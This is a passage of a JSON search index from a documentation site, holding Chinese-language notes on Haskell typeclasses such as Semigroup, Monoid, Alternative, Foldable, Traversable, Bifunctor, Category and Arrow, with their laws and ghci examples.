\u4e2d\u7684\u503c\u65f6\u7528\u4e86\u6a21\u5f0f\u5339\u914d\uff0c\u4f46\u662f\u56e0\u4e3a\u5176\u5185\u5bb9\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0cx:xs \u5339\u914d\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u8fd9\u65f6\u5c31\u4f1a\u89e6\u53d1 fail \u51fd\u6570\u76f4\u63a5\u8fd4\u56de Nothing","title":"MonadFail \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#monadfail-law","text":"fail s >>= m = fail s","title":"MonadFail Law"},{"location":"cs/pl/haskell/#semigroup","text":"\u534a\u7fa4\uff08semigroup\uff09\u662f\u4e00\u4e2a\u96c6\u5408 \\(S\\) \uff0c\u5b83\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26 \\(\\oplus\\) \uff0c\u5e76\u4e14\u6ee1\u8db3 \\[ a\\oplus b \\in S\\quad a, b\\in S \\] \u4ee5\u53ca\u7ed3\u5408\uff08associative\uff09\u5f8b\uff1a \\[ (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c) \\] \u8fd9\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26\u5728 Haskell \u7684 Semigroup \u4e2d\u88ab\u5b9a\u4e49\u4e3a <> \u51fd\u6570\uff1a class Semigroup a where ( <> ) :: a -> a -> a sconcat :: NonEmpty a -> a sconcat ( a :| as ) = go a as where go b ( c : cs ) = b <> go c cs go b [] = b stimes :: Integarl b => b -> a -> a stimes = ... \u9664\u6b64\u4e4b\u5916\u8fd8\u6709 sconcat \u548c stimes \u51fd\u6570\uff0c\u90fd\u7ed9\u51fa\u4e86\u9ed8\u8ba4\u5b9e\u73b0\u3002\u5bf9\u4e8e\u5217\u8868\uff0c<> \u76f8\u5f53\u4e8e (++)\uff0cstimes \u76f8\u5f53\u4e8e concat . replicate\uff1a ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > sconcat $ fromList [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ] ghci > stimes 3 [ 1 , 2 ] [ 1 , 2 , 1 , 2 , 1 , 2 ]","title":"Semigroup"},{"location":"cs/pl/haskell/#semigroup-law","text":"(x <> y) <> z = x <> (y <> z)","title":"Semigroup Law"},{"location":"cs/pl/haskell/#nonempty","text":"NonEmpty \u8868\u793a\u975e\u7a7a\u5217\u8868\uff0c\u5b9a\u4e49\u662f\uff1a data NonEmpty a = a :| [ a ] deriving ( Eq , Ord ) \u4f7f\u7528\u4e00\u4e2a\u5143\u7d20\u548c\u4e00\u4e2a\u5217\u8868\u7528 :| \u8fde\u63a5\u5c31\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a NonEmpty \u7c7b\u578b\u7684\u5217\u8868 Data.List.NonEmpty \u6a21\u5757\u4e2d\u5b9e\u73b0\u4e86\u5f88\u591a\u666e\u901a\u5217\u8868\u6709\u7684\u51fd\u6570\uff0c\u9700\u8981 qualified import \u540e\u8c03\u7528\uff0c\u4f7f\u7528 fromList\u3001toList \u51fd\u6570\u53ef\u4ee5\u5728\u666e\u901a\u5217\u8868\u548c\u975e\u7a7a\u5217\u8868\u4e4b\u95f4\u8f6c\u6362 ghci > import qualified Data.List.NonEmpty as NE ghci > arr = NE . fromList [ 1 , 2 , 3 ] ghci > arr 1 :| [ 2 , 3 ] ghci > NE . head arr 1 ghci > NE . tail arr [ 2 , 3 ]","title":"\u8865\uff1aNonEmpty"},{"location":"cs/pl/haskell/#monoid","text":"\u5e7a\u534a\u7fa4\uff08Monoid\uff09\u662f\u4e00\u4e2a\u6709\u5355\u4f4d\u5143\u7d20 \\(e\\) \u7684\u534a\u7fa4\uff0c\u5373 \\(e\\) \u6ee1\u8db3\uff1a \\[ e\\oplus x = x\\oplus e = x \\] class Semigroup a => Monoid a where mempty :: a mappend :: a -> a -> a mappend = ( <> ) mconcat :: [ a ] -> a mconcat = foldr mappend mempty \u53ef\u4ee5\u770b\u51fa Monoid \u8981\u6c42\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u6700\u5c11\u53ea\u9700\u8981 mempty \uff0c\u5b83\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8868\u793a\u5355\u4f4d\u5143\u7d20\u3002 mappend \u5373 Semigroup \u4e2d\u7684 <> \u8fd0\u7b97\u7b26\uff0c mconcat \u4e5f\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u5b9e\u73b0","title":"Monoid"},{"location":"cs/pl/haskell/#monoid_1","text":"","title":"Monoid \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#a_1","text":"\u56e0\u4e3a Monoid \u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u50cf Functor \u7b49\u4e00\u6837\u7b49\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6240\u4ee5 [] \u5e76\u4e0d\u662f Monoid \u7684\u5b9e\u4f8b\uff0c\u4f46\u662f\u5177\u4f53\u7c7b\u578b [a] \u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a instance Semigroup [ a ] where ( <> ) = ( ++ ) instance Monoid [ a ] where mempty = [] mconcat xss = [ x | xs <- xss , x <- xs ] \u5217\u8868\u7684\u5355\u4f4d\u5143\u7d20\uff08mempty\uff09\u5c31\u662f\u7a7a\u5217\u8868 []\uff0c\u8fd0\u7b97\u7b26\u5c31\u662f\u5408\u5e76\u5217\u8868 (++)\uff0cmconcat \u4e5f\u7528\u5217\u8868\u63a8\u5bfc\u91cd\u65b0\u5b9e\u73b0\u63d0\u9ad8\u6548\u7387 ghci > mempty :: [ Int ] [] ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > [ 1 , 2 ] ` mappend ` [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > mconcat [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ]","title":"[a]"},{"location":"cs/pl/haskell/#ordering","text":"instance Semigroup Ordering where LT <> _ = LT EQ <> y = y GT <> _ = GT instance Monoid Ordering where mempty = EQ \u4e3b\u8981\u53ef\u4ee5\u7528\u4e8e\u6bd4\u8f83\u5b57\u5178\u5e8f\uff1a ghci > mconcat ( zipWith compare \"abcd\" \"acbd\" ) LT","title":"Ordering"},{"location":"cs/pl/haskell/#sum-product","text":"\u5bf9\u4e8e\u6570\u5b57\uff0c\u52a0\u6cd5\u548c\u4e58\u6cd5\u90fd\u6ee1\u8db3\u7ed3\u5408\u5f8b\uff0c\u6240\u4ee5\u5bf9\u4e8e Num\uff0c\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u4f46\u662f\u4e0d\u80fd\u4e3a\u540c\u4e00\u7c7b\u578b\u8bbe\u7f6e\u4e24\u79cd\u5b9e\u4f8b\u65b9\u5f0f\uff0c\u6240\u4ee5 Data.Monoid \u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\u2014\u2014\u2014\u2014 Sum \u548c Product\uff1a newtype Sum a = Sum { getSum :: a } deriving ( ... ) newtype Product a = Product { getProduct :: a } deriving ( ... ) \u5b83\u4eec\u4f7f\u7528 Sum \u6216 Product \u6765\u5305\u88c5\u8d77\u4e00\u4e2a\u6570\u5b57\uff0c\u53ef\u4ee5\u901a\u8fc7 getSum \u6216 getProduct \u6765\u83b7\u53d6\u5176\u4e2d\u7684\u503c \u5bf9\u4e8e\u52a0\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (+)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 0\uff1b\u5bf9\u4e8e\u4e58\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (*)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 1: instance Num a => Semigroup ( Sum a ) where ( <> ) = coerce (( + ) :: a -> a -> a ) instance Num a => Monoid ( Sum a ) where mempty = Sum 0 instance Num a => Semigroup ( Product a ) where ( <> ) = coerce (( * ) :: a -> a -> a ) instance Num a => Monoid ( Product a ) where mempty = Product 1 ghci > Sum 5 <> Sum 6 <> Sum 10 Sum { getSum = 21 } ghci > getSum . mconcat . fmap Sum $ [ 5 , 6 , 10 ] 21 ghci > Product 5 <> Product 6 <> Product 10 Product { getProduct = 300 } ghci > getProduct . mconcat . fmap Product $ [ 5 , 6 , 10 ] 300","title":"Sum &amp; Product"},{"location":"cs/pl/haskell/#all-any","text":"\u548c\u6570\u5b57\u4e00\u6837\uff0c\u5e03\u5c14\u503c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u56e0\u6b64 Data.Monoid \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\uff0c\u5206\u522b\u5b9e\u73b0\u4e86\u8fd9\u4e24\u79cd Monoid\uff1a newtype All = All { getAll :: Bool } deriving ( ... ) instance Semigroup All where ( <> ) = coerce ( && ) instance Monoid All where mempty = All True newtype Any = Any { getAny :: Bool } deriving ( ... ) instance Semigroup Any where ( <> ) = coerce ( || ) instance Monoid Any where mempty = Any False ghci > getAll ( All True <> mempty <> All False ) False ghci > getAll ( mconcat ( map ( \\ x -> All ( even x )) [ 2 , 4 , 6 , 7 , 8 ])) False ghci > getAny ( Any True <> mempty <> Any False ) True ghci > getAny ( mconcat ( map ( \\ x -> Any ( even x )) [ 2 , 4 , 6 , 7 , 8 ])) True","title":"All &amp; Any"},{"location":"cs/pl/haskell/#monoid-a-maybe-a","text":"\u5982\u679c a \u662f\u4e00\u4e2a(\u5e7a)\u534a\u7fa4\uff0c\u90a3\u4e48 Maybe a \u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff0c\u5355\u4f4d\u5143\u5c31\u662f Nothing\uff1a instance Semigroup a => Semigroup ( Maybe a ) where Nothing <> b = b a <> Nothing = a Just a <> Just b = Just ( a <> b ) instance Semigroup a => Monoid ( Maybe a ) where mempty = Nothing ghci > Nothing <> Just \"andy\" Just \"andy\" ghci > Just LT <> Nothing Just LT ghci > Just ( Sum 3 ) <> Just ( Sum 4 ) Just ( Sum { getSum = 7 })","title":"Monoid a =&gt; Maybe a"},{"location":"cs/pl/haskell/#first-last","text":"\u5bf9\u4e8e Maybe \u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u6cd5\uff0c\u5373 <> \u64cd\u4f5c\u6bcf\u6b21\u6052\u53d6\u5de6\u8fb9\u548c\u6bcf\u6b21\u6052\u53d6\u53f3\u8fb9\uff08\u5728\u6ca1\u6709 Nothing \u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u6240\u4ee5 Data.Monoid \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u65b0\u7684\u5305\u88c5\u5668\uff1aFirst \u548c Last\uff1a newtype First a = First { getFirst :: Maybe a } deriving ( ... ) instance Semigroup ( First a ) where First Nothing <> b = b a <> _ = a instance Monoid ( First a ) where mempty = First Nothing newtype Last a = Last { getLast :: Maybe a } deriving ( ... ) instance Semigroup ( Last a ) where a <> Last Nothing = a _ <> b = b instance Monoid ( Last a ) where mempty = Last Nothing ghci > getFirst ( First ( Just \"hello\" ) <> First Nothing <> First ( Just \"world\" )) Just \"hello\" ghci > getLast ( Last ( Just \"hello\" ) <> Last Nothing <> Last ( Just \"world\" )) Just \"world\" ghci > getFirst . mconcat . map First $ [ Nothing , Just 9 , Just 10 ] Just 9 ghci > getLast . mconcat . map Last $ [ Nothing , Just 9 , Just 10 ] Just 10","title":"First &amp; Last"},{"location":"cs/pl/haskell/#min-max","text":"\u5bf9\u4e8e\u6709\u754c\u7684\u7c7b\u578b\uff0c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u6bcf\u6b21\u4e8c\u5143\u64cd\u4f5c\u90fd\u53d6\u6700\u5c0f\u6216\u6700\u5927\u3002 Data.Semigroup \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5176\u5668\uff1aMin \u548c Max\uff1a newtype Min a = Min { getMin :: a } deriving ( ... ) instance Ord a => Semigroup ( Min a ) where ( <> ) = coerce ( min :: a -> a -> a ) instance ( Ord a , Bounded a ) => Monoid ( Min a ) where mempty = maxBound newtype Max a = Max { getMax :: a } deriving ( ... ) instance Ord a => Semigroup ( Max a ) where ( <> ) = coerce ( max :: a -> a -> a ) instance ( Ord a , Bounded a ) => Monoid ( Max a ) where mempty = minBound ghci > Min 3 <> Min 5 Min { getMin = 3 } ghci > Max 3 <> Max 5 Max { getMax = 5 } ghci > getMin . mconcat . map Min $ [ 1 , 2 , 3 ] :: Int 1 ghci > getMax . mconcat . map Max $ [ 1 , 2 , 3 ] :: Int 3","title":"Min &amp; Max"},{"location":"cs/pl/haskell/#_21","text":"\u5f53\u5143\u7ec4\u5185\u7684\u6240\u6709\u5143\u7d20\u90fd\u662f\u5e7a\u534a\u7fa4\u65f6\uff0c\u6574\u4e2a\u5143\u7ec4\u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a instance ( Semigroup a , Semigroup b ) => Semigroup ( a , b ) where ( a , b ) <> ( a' , b' ) = ( a <> a' , b <> b' ) stimes n ( a , b ) = ( stimes n a , stimes n b ) instance ( Monoid a , Monoid b ) => Monoid ( a , b ) where mempty = ( mempty , mempty ) ghci > mconcat $ map ( \\ x -> ( Min x , Max x )) [ 1 .. 10 ] :: ( Min Int , Max Int ) ( Min { getMin = 1 }, Max { getMax = 10 })","title":"\u5143\u7ec4"},{"location":"cs/pl/haskell/#monoid-laws","text":"mempty <> x = x x <> mempty = x (x <> y) <> z = x <> (y <> z)","title":"Monoid Laws"},{"location":"cs/pl/haskell/#monoidal-classes","text":"Applicative\u3001Monad\u3001Arrow \u90fd\u6709\u6709\u5e7a\u534a\u7fa4\u6027\u8d28\u7684\u5b50\u7c7b\u578b\u7c7b\uff0c\u5206\u522b\u662f Alternative\u3001MonadPlus\u3001ArrowPlus","title":"Monoidal classes"},{"location":"cs/pl/haskell/#alternative","text":"class Applicative f => Alternative f where -- | The identity of '<|>' empty :: f a -- | An associative binary operation ( <|> ) :: f a -> f a -> f a some :: f a -> f [ a ] some v = ( : ) <$> v <*> many v many :: f a -> f [ a ] many v = some v <|> pure [] \u5176\u4e2d empty \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u5355\u4f4d\u5143\u7d20\uff0c<|> \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u4e8c\u5143\u8fd0\u7b97\u7b26\u3002some \u548c many \u662f\u4e24\u4e2a\u51fd\u6570\uff08 \u610f\u4e49\u8fd8\u4e0d\u61c2 \uff09","title":"Alternative"},{"location":"cs/pl/haskell/#alternative_1","text":"","title":"Alternative \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#alternative-laws","text":"Monoid laws : empty <|> x = x x <|> empty = x ( x <|> y ) <|> z = x <|> ( y <|> z ) Left zero law \uff1aempty <*> f = empty \u4ee5\u4e0a\u7684\u5b9a\u5f8b\u662f\u90fd\u6ee1\u8db3\u90fd\uff0c\u4e0b\u9762\u7684\u5b9a\u5f8b\u53ea\u6709\u90e8\u5206\u6ee1\u8db3\uff1a Right zero law \uff1af <*> empty = empty \uff08\u5927\u90e8\u5206\u5305\u62ec Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u4e0d\u6ee1\u8db3\uff09 Left distribution \uff1a(a <|> b) < > c = (a < > c) <|> (b <*> c) \uff08Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u53ca\u5927\u90e8\u5206 parsers \u4e0d\u6ee1\u8db3\uff09 Right distribution \uff1aa < > (b <|> c) = (a < > b) <|> (a <*> c) \uff08\u5927\u90e8\u5206\u4e0d\u6ee1\u8db3\uff0c\u4f46 Maybe \u6ee1\u8db3\uff09 Left catch \uff1a(pure a) <|> x = pure a \uff08Maybe\u3001IO\u3001parsers \u6ee1\u8db3\uff0c\u4f46 [] \u4e0d\u6ee1\u8db3\uff09","title":"Alternative Laws"},{"location":"cs/pl/haskell/#_23","text":"asum :: (Foldable t, Alternative f) => t (f a) -> f a\uff0c\u76f8\u5f53\u4e8e foldr (<|>) empty\uff1a ghci > asum [ Nothing , Just 5 , Just 3 ] Just 5 ghci > asum [[ 2 ],[ 3 ],[ 4 , 5 ]] [ 2 , 3 , 4 , 5 ] guard :: (Alternative f) => Bool -> f ()\uff1a guard True = pure () guard False = empty","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#monadplus","text":"class ( Alternative m , Monad m ) => MonadPlus m where mzero :: m a mzero = empty mplus :: m a -> m a -> m a mplus = ( <|> )","title":"MonadPlus"},{"location":"cs/pl/haskell/#monadplus_1","text":"[]\u3001Maybe \u90fd\u662f MonadPlus \u7684\u5b9e\u4f8b\uff0cmzero \u548c mplus \u90fd\u7531 Alternative \u5b9e\u73b0","title":"MonadPlus\u5b9e\u4f8b"},{"location":"cs/pl/haskell/#monadplus-laws","text":"Monoid laws Left zero \uff1amzero >>= f = mzero Right zero \uff1am >> mzero = mzero","title":"MonadPlus Laws"},{"location":"cs/pl/haskell/#_24","text":"msum = asum mfilter \uff1a mfilter p ma = do a <- ma if p a then return a else mzero","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#arrowplus","text":"ArrowZero \u548c ArrowPlus \u5206\u522b\u4e3a Arrow \u8bbe\u7f6e\u4e86 Monoid \u4e2d\u7684\u5355\u4f4d\u5143\u7d20\u548c\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0c\u4f7f\u4e4b\u6210\u4e3a\u4e86\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a class Arrow arr => ArrowZero arr where zeroArrow :: b ` arr ` c class ArrowZero arr => ArrowPlus arr where ( <+> ) :: ( b ` arr ` c ) -> ( b ` arr ` c ) -> ( b ` arr ` c )","title":"ArrowPlus"},{"location":"cs/pl/haskell/#typeclasses_1","text":"","title":"\u4e00\u4e9b\u5176\u5b83 Typeclasses"},{"location":"cs/pl/haskell/#foldable","text":"Foldable \u662f\u8868\u793a\u53ef\u4ee5\u6298\u53e0\uff08fold\uff09\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Foldable \u4e2d\u5b9a\u4e49\uff0c\u8fd9\u4f7f\u5f97\u548c fold \u76f8\u5173\u7684\u51fd\u6570\u53ef\u4ee5\u7528\u5728\u4efb\u610f Foldable \u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0a\u3002\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class Foldable t where fold :: Monoid m => t m -> m foldMap :: Monoid m => ( a -> m ) -> t a -> m foldMap' :: Monoid m => ( a -> m ) -> t a -> m foldr :: ( a -> b -> b ) -> b -> t a -> b foldr' :: ( a -> b -> b ) -> b -> t a -> b foldl :: ( b -> a -> b ) -> b -> t a -> b foldl' :: ( b -> a -> b ) -> b -> t a -> b foldr1 :: ( a -> a -> a ) -> t a -> a foldl1 :: ( a -> a -> a ) -> t a -> a toList :: t a -> [ a ] null :: t a -> Bool length :: t a -> Int elem :: Eq a => a -> t a -> Bool maximum :: Ord a => t a -> a minimum :: Ord a => t a -> a sum :: Num a => t a -> a product :: Num a => t a -> a {-# MINIMAL foldMap | foldr #-} \u6700\u5c11\u53ea\u8981\u5b9e\u73b0 foldr \u548c foldMap \u5176\u4e2d\u4e4b\u4e00\u5c31\u53ef\u4ee5\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff0c\u5176\u5b83\u7684\u51fd\u6570\u90fd\u6709\u7531\u8fd9\u4e24\u4e2a\u51fd\u6570\u63d0\u4f9b\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u800c\u4e14\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e4b\u95f4\u4e5f\u6709\u76f8\u4e92\u5b9e\u73b0\u3002\u56e0\u6b64\u53ea\u8981\u5b9e\u73b0 foldr \u6216 foldMap \u4e00\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5\u4f7f\u7528\u6240\u6709\u5176\u5b83 Foldable \u4e2d\u7684\u51fd\u6570\u3002foldr \u51fd\u6570\u5728\u524d\u9762\u5df2\u7ecf\u6709\u5b66\u8fc7\uff0cfoldMap \u7684\u4f8b\u5b50\u662f\uff1a ghci > foldMap Sum [ 1 , 3 , 5 ] Sum { getSum = 9 } ghci > foldMap Product [ 1 , 3 , 5 ] Product { getProduct = 15 } ghci > foldMap ( replicate 3 ) [ 1 , 2 , 3 ] [ 1 , 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 ]","title":"Foldable"},{"location":"cs/pl/haskell/#foldable_1","text":"[]\u3001Maybe\u3001Either a\u3001(,) a \u90fd\u662f Foldable \u7684\u5b9e\u4f8b\uff0c\u6807\u51c6\u5bb9\u5668\u5e93\u4e2d\u7684 Map\u3001Set \u7b49\u4e5f\u90fd\u662f Foldable \u7684\u5b9e\u4f8b\u3002\u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e8c\u53c9\u6811\u7c7b\u578b\uff0c\u5e76\u4f7f\u5176\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff1a data Tree a = Empty | Leaf a | Node ( Tree a ) a ( Tree a ) instance Foldable Tree where foldMap :: Monoid m => ( a -> m ) -> Tree a -> m foldMap f Empty = mempty foldMap f ( Leaf x ) = f x foldMap f ( Node l k r ) = foldMap f l ` mappend ` f k ` mappend ` foldMap f r","title":"Foldable \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#_25","text":"asum :: (Alternative f, Foldable t) => t (f a) -> f a\uff0c\u7528 <|> \u9010\u4e2a\u8fde\u63a5\u6240\u6709\u5143\u7d20 sequenceA_ :: (Applicative f, Foldable t) => t (f a) -> f ()\uff0c\u7531\u4e8e\u4e22\u5f03\u7ed3\u679c\uff0c\u6240\u4ee5 Foldable t \u5c31\u53ef\u4ee5\u6ee1\u8db3\uff1b\u56e0\u6b64\u4e0d\u540c\u4e8e sequenceA \u9700\u8981 Traversable traverse_ :: (Applicative f, Foldable t) => (a -> f b) -> t a -> f () for_ :: (Applicative f, Foldable t) => t a -> (a -> f b) -> f ()","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#traversable","text":"Traversable \u662f\u8868\u793a\u53ef\u904d\u5386\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Traversable \u6a21\u5757\u4e2d\u5b9a\u4e49\uff0c\u5b83\u662f Foldable \u7684\u5347\u7ea7\u7248\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a Functor\uff0c\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class ( Functor t , Foldable t ) => Traversable t where traverse :: Applicative f => ( a -> f b ) -> t a -> f ( t b ) sequenceA :: Applicative f => t ( f a ) -> f ( t a ) mapM :: Monad m => ( a -> m b ) -> t a -> m ( t b ) sequence :: Monad m => t ( m a ) -> m ( t a ) {-# MINIMAL traverse | sequenceA #-} \u6700\u5c11\u53ea\u9700\u8981\u5b9e\u73b0 traverse \u51fd\u6570\u6216\u8005 sequenceA \u51fd\u6570\u3002\u5176\u4e2d\u5404\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u901a\u8fc7\u7c7b\u578b\u7b7e\u540d\u4e5f\u90fd\u80fd\u63a8\u6d4b\u51fa\u6765\u3002\u4f46\u662f\u5176\u4e2d mapM \u5c31\u662f traverse\uff0csequence \u5c31\u662f sequenceA\uff0c\u5b83\u4eec\u5b58\u5728\u53ea\u662f\u5386\u53f2\u9057\u7559","title":"Traversable"},{"location":"cs/pl/haskell/#traversable_1","text":"instance Traversable Maybe where traverse _ Nothing = pure Nothing traverse f ( Just x ) = Just <$> f x instance Traversable [] where {-# INLINE traverse #-} traverse f = foldr cons_f ( pure [] ) where cons_f x ys = liftA2 ( : ) ( f x ) ys instance Traversable ( Either a ) where traverse _ ( Left x ) = pure ( Left x ) traverse f ( Right y ) = Right <$> f y instance Traversable ((,) a ) where traverse f ( x , y ) = (,) x <$> f y ... \u4e0a\u9762\u7684 Tree \u4e5f\u53ef\u4ee5\u6210\u4e3a Traversable \u7684\u5b9e\u4f8b\uff1a instance Functor Tree where fmap :: ( a -> b ) -> Tree a -> Tree b fmap g Empty = Empty fmap g ( Leaf x ) = Leaf $ g x fmap g ( Node l x r ) = Node ( fmap g l ) ( g x ) ( fmap g r ) instance Traversable Tree where traverse :: Applicative f => ( a -> f b ) -> Tree a -> f ( Tree b ) traverse g Empty = pure Empty traverse g ( Leaf x ) = Leaf <$> g x traverse g ( Node l x r ) = Node <$> traverse g l <*> g x <*> traverse g r","title":"Traversable \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#traversable-laws","text":"Traversable \u4e5f\u6709\u4e24\u6761\u5b9a\u5f8b\uff1a 1. traverse Identity = Identity 2. traverse (Compose . fmap g . f) = Compose . fmap (traverse g) . traverse f \u5176\u4e2d Identity \u548c Compose \u5206\u522b\u5b9a\u4e49\u5728 Data.Functor.Identity \u548c Data.Functor.Compose \u4e24\u4e2a\u6a21\u5757\u4e2d\uff1a newtype Identity a = Identity { runIdentity :: a } deriving ( ... ) newtype Compose f g a = Compose { getCompose :: f ( g a ) } deriving ( ... )","title":"Traversable Laws"},{"location":"cs/pl/haskell/#bifunctor","text":"Functor \u7684\u5b9e\u4f8b\u7684 kind \u90fd\u662f * -> *\uff0c\u56e0\u6b64 fmap \u53ea\u80fd\u5c06\u4e00\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u4e0a\u3002\u800c Bifunctor\uff08\u5728 Data.Bifunctor \u6a21\u5757\u4e2d\u5b9a\u4e49\uff09\u7684\u5b9e\u4f8b\u7684 kind \u662f * -> * -> *\uff0c\u800c\u4e14\u5b83\u7684 bimap \u53ef\u4ee5\u540c\u65f6\u5c06\u4e24\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e24\u4e2a\u503c\u4e0a\uff1a class Bifunctor p where bimap :: ( a -> b ) -> ( c -> d ) -> p a c -> p b d first :: ( a -> b ) -> p a c -> p b c second :: ( b -> c ) -> p a b -> p a c {-# MINIMAL bimap | first, second #-} \u540c\u65f6 bimap \u548c first,second \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\uff1a bimap f g = first f . second g first f = bimap f id second g = bimap id g \u5bf9\u4e8e Functor\uff0c((,) e) \u548c Either e \u624d\u662f Functor \u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u4ed6\u4eec\u662f * -> *\u3002\u4f46\u662f\u5bf9\u4e8e Bifunctor\uff0c(,) \u548c Either \u5c31\u662f Bifunctor \u7684\u5b9e\u4f8b\uff1a ghci > bimap ( + 1 ) length ( 4 , [ 1 , 2 , 3 ]) ( 5 , 3 )","title":"Bifunctor"},{"location":"cs/pl/haskell/#bifunctor-laws","text":"bimap id id = id first id = id second id = id bimap (f . g) (h . i) = bimap f h . bimap g i first (f . g) = first f . first g second (f . g) = second f . second g","title":"Bifunctor Laws"},{"location":"cs/pl/haskell/#category","text":"Haskell \u4e2d\u7684 Category \u5c06\u4e00\u822c\u7684\u51fd\u6570\u63a8\u5e7f\u5230\u4e86\u666e\u904d\u7684\u6001\u5c04\u4e0a\uff0c\u5b83\u5728 Control.Category \u6a21\u5757\u4e2d\uff0c\u5b9a\u4e49\u662f\uff1a class Category cat where id :: cat a a ( . ) :: cat b c -> cat a b -> cat a c \u5b83\u7684\u5b9e\u4f8b\u6709 (->) \u548c Kleisli m \uff1a instance Category ( -> ) where id = GHC . Base . id ( . ) = ( GHC . Base .. ) Kleisli \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u7528\u6765\u8868\u793a\u51fd\u6570 a -> m b\uff0cHaskell \u4e2d\uff0c\u5b83\u5728 Control.Arrow \u6a21\u5757\u4e2d\u5b9a\u4e49\uff1a newtype Kleisli m a b = Kleisli { runKleisli :: a -> m b } instance Monad m => Category ( Kleisli m ) where id :: Kleisli m a a id = Kleisli return ( . ) :: Kleisli m b c -> Kleisli m a b -> Kleisli m a c Kleisli g . Kleisli h = Kleisli ( h >=> g ) Category \u8981\u6ee1\u8db3\u7684\u5b9a\u5f8b\u53ea\u6709 id \u662f (.) \u64cd\u4f5c\u7684\u5355\u4f4d\u5143\uff0c\u4ee5\u53ca (.) \u64cd\u4f5c\u662f\u53ef\u7ed3\u5408\u7684 \u540c\u65f6 Category \u8fd8\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570 <<< \u548c >>> \uff1a ( <<< ) :: Category cat => cat b c -> cat a b -> cat a c ( <<< ) = ( . ) ( >>> ) :: Category cat => cat a b -> cat b c -> cat a c f >>> g = g . f","title":"Category"},{"location":"cs/pl/haskell/#arrow","text":"Arrow \u5c06\u51fd\u6570\u8fdb\u4e00\u6b65\u62bd\u8c61\u5316\uff0c\u5b83\u5b9a\u4e49\u5728 Control.Arrow \u6a21\u5757\u4e2d\uff1a class Category a => Arrow a where arr :: ( b -> c ) -> a b c first :: a b c -> a ( b , d ) ( c , d ) second :: a b c -> a ( d , b ) ( d , c ) ( *** ) :: a b c -> a b' c' -> a ( b , b' ) ( c , c' ) ( &&& ) :: a b c -> a b c' -> a b ( c , c' ) {-# MINIMAL arr, (first | (***)) #-} 